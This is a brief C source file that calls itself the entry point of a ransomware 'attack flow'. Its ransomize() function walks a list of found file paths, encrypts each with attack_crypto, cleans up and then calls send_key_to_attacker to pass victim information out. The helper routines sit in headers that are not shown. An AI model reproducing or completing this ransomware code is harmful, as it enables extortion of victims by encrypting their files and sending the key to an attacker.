/*  This file contains the code for the LUCA attack flow. It is the entry point for the ransomization. */
#include <stdio.h>
#include <stdlib.h>

#include "attack.h"
#include "attack_crypto.h"
#include "attack_web.h"
#include "read_files.h"

/* Attack entry point */
int ransomize(void) {
    size_t count = 0;
    char **paths = find_paths(&count);

    if (!paths) {
        return 1;
    }

    for (size_t i = 0; i < count; i++) {
        attack_crypto(paths[i]);
        free(paths[i]);
    }

    free(paths);
    
    crypto_cleanup();

    // Send victim information to the attacker
    send_key_to_attacker();

    return 0;
}
